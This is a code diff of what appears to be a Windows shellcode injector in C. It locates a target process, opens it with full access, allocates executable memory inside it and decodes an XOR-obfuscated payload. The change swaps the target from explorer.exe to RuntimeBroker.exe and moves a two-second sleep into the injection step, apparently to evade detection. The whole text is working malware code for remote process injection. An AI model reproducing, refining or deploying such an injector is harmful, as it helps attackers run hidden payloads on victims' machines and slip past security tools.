@@ -28,7 +28,7 @@ void XODEC(char* code, DWORD codeLen, unsigned char* key, DWORD keyLen) {
 
 
 int main() {
-    Sleep(2000);
+    
     
     char* AESkey;
     DWORD AESkeyLen;
@@ -48,9 +48,9 @@ int main() {
     Process32First(snapshot, &pe32);
     
     while(Process32Next(snapshot, &pe32)) {
-       if (strcmp(pe32.szExeFile, "explorer.exe") == 0){
+       if (strcmp(pe32.szExeFile, "RuntimeBroker.exe") == 0){
               HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
-              
+              Sleep(2000);
               LPVOID CAMLO = VirtualAllocEx(hProcess, NULL, AESCodeLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
               
               XODEC(AESCode, AESCodeLen, AESkey , AESkeyLen);
